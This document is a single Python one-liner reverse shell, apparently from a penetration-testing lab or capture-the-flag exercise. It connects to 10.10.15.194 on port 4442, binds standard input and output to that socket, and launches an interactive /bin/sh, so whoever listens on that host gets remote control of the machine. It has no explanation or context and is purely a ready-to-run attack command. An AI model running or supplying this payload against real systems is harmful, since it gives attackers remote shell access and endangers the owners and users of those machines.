python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.10.15.194",4442));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
